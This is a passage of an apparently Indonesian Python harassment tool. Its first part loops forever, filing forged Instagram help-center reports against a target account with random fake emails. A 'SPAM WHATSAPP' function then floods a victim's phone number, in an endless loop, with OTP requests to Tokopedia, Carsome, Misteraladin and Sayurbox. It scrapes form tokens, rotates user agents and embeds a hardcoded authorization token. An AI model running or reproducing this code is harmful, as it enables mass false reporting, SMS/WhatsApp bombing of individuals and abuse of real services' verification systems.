        "sec-ch-ua-platform": "\"Android\"",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "origin": "https://help.instagram.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://help.instagram.com/contact/723586364339719",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5",
        "cookie": "ig_nrcb\u003d1"}
    r=0
    while True:
     dt1 = datetime.now()
     ts1 = str(datetime.timestamp(dt1)).split('.')[0]
     us='qwertyuiopasdfghjklzxcvbnm._1234567890'
     boy=str("".join(random.choice(us)for i in range(10)))
     email=boy+'@gmail.com'
     data=f'jazoest=2931&lsd=AVq5uabXj48&Field258021274378282={user}&Field735407019826414={name}&Field506888789421014[year]=2014&Field506888789421014[month]=11&Field506888789421014[day]=11&Field294540267362199=Parent&inputEmail={email}&support_form_id=723586364339719&support_form_locale_id=en_US&support_form_hidden_fields=%7B%7D&support_form_fact_false_fields=[]&__user=0&__a=1&__req=6&__hs=19552.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=GOOD&__rev=1007841948&__s=s4c6vz%3Anapxo9%3An9ncx2&__hsi=7255652935514227640&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW8xi642-7E2vwXw5ux60Vo1upE4W0OE2WxO2O1Vwooa81VohwnU1e42C220qu1Tw40wdq0Ho2ewnE3fw6iw4vwbS1Lw4Cwcq&__csr=&__spin_r=1007841948&__spin_b=trunk&__spin_t={ts1}'
     res=requests.post('https://help.instagram.com/ajax/help/contact/submit/page',data=data,headers=head).status_code
     if res == 200:
        print(f'{M}[{P}+{M}]{O} Reporting To Account {M}{user} {O}Status: {H}Succes')
     else:
        print(f'{M}[{P}-{M}] {O} Reporting To Account {M}{user} {O}Status: {M}Fail')
     
def logo_spam():
    Write.Print(f"""
             ___ ___  _   __  __             
            / __| _ \/_\ |  \/  |            
            \__ \  _/ _ \| |\/| |            
 __      ___|___/_|/_/_\_\_|_ |_|   ___ ___  
 \ \    / / || | /_\_   _/ __| /_\ | _ \ _ \ 
  \ \/\/ /| __ |/ _ \| | \__ \/ _ \|  _/  _/ 
   \_/\_/ |_||_/_/ \_\_| |___/_/ \_\_| |_|   
                                             
""", Colors.red_to_yellow, interval=0.025)
def jam(nomor):
        
        while True:
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            Carsome_wa                             =  requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","x-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"A4p3vs1Ixu9wp3wFmCEG9K","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
            Misteraladin                           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
            Sayurbox_wa                            =  requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={"Host":"www.sayurbox.com","content-length":"289","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g","content-type":"application/json","accept":"*/*","x-bundle-revision":"6.0","x-sbox-tenant":"sayurbox","x-binary-version":"2.2.1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.sayurbox.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"})).text
            """
            rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		          kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		          regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		          Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		          formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		          req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		     """     
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; LCJB; rv:11.0) like Gecko",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
 
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12F69 Safari/600.1.4",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
